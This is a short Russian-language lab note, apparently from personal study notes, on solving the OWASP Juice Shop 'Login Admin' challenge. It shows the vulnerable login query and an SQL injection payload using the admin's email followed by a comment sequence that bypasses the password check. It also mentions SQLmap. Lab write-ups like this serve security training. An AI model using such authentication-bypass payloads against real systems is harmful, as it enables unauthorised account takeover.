### Оглавление

---
#### Injection

**Login Admin**
аутентификация пользователя происходит при помощи следующей схемы: 
```
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
по факту нужно найти почту админа, она будет в отзывах на заказы, 
используем ее и получаем такой запрос `admin@juice-sh.op'-- `
```
SELECT * FROM users WHERE username = 'admin@juice-sh.op'-- ' AND password = 'password'
```
Login Jim и Login **Bender** проходятся аналогично, хотя по факту можно и другими путями 
**C помощью [[SQLmap]]**
